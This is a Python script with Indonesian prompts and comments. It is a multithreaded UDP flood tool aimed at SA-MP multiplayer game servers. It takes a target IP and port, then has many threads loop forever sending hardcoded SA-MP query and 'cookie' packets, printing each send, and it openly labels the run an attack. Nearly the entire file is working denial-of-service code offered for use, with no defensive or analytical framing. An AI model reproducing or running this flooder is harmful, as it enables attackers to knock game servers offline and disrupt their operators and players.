#!/usr/bin/env python3
# DI BUAT OLEH POLOSS




import socket
import struct
import codecs
import threading
import random
import time
import os
import sys

#(bisa ditambah custom hex sendiri)
hex_packets = [
    "53414d5090d91d4d611e700a465b00",  # p
    "53414d509538e1a9611e63",          # c
    "53414d509538e1a9611e69",          # i
    "53414d509538e1a9611e72",          # r
    "081e62da",                        # cookie port 7796
    "081e77da",                        # cookie port 7777
    "081e4dda",                        # cookie port 7771
    "021efd40",                        # cookie port 7784
    "081e7eda"                         # another cookie 7784
]

PACKETS = [codecs.decode(h, "hex_codec") for h in hex_packets]

def get_target_info():
    if len(sys.argv) >= 3:
        return sys.argv[1], int(sys.argv[2])
    else:
        ip = input("Masukkan IP Target: ")
        port = int(input("Masukkan Port Target: "))
        return ip, port

class SAMPAttack(threading.Thread):
    def __init__(self, ip, port, method="basic"):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.method = method

    def run(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                pkt = PACKETS[random.randint(0, 3)]

                sock.sendto(pkt, (self.ip, self.port))

                if self.port == 7777:
                    sock.sendto(PACKETS[5], (self.ip, self.port))
                elif self.port == 7796:
                    sock.sendto(PACKETS[4], (self.ip, self.port))
                elif self.port == 7771:
                    sock.sendto(PACKETS[6], (self.ip, self.port))
                elif self.port == 7784:
                    sock.sendto(PACKETS[7], (self.ip, self.port))

                print(f"[+] Packet sent to {self.ip}:{self.port} [{self.method}]")
                time.sleep(0.01)

            except Exception as e:
                print(f"[!] Error: {e}")
                continue

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')

    print("""
    ⣿⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀⠀⠀⠀⠀⠀
⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⣆⠀⠀⠀⠀
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠋⠀⠀⠀⠀
⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢸⣿⣿⣧⣿⣿⣆⠙⢆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⣿⣿⣿⣷⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⣿⣿⣿⠏⢧⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠈⢳⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣼⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠛⠻⠿⣿⣿⣿⡿⠿⠿⠿⠿⠿⢿⣿⣿⠏⠀⠀
===============================================
⠀⠀⠀⠀    """)

    ip, port = get_target_info()
    threads = int(input("Jumlah Threads: "))
    method = input("Metode (basic / custom): ").strip().lower()

    print(f"\n[+] Menyerang {ip}:{port} dengan {threads} threads...\n")

    try:
        for _ in range(threads):
            t = SAMPAttack(ip, port, method)
            t.start()
            time.sleep(0.05)
    except KeyboardInterrupt:
        print("\n[!] Serangan dihentikan oleh user.")
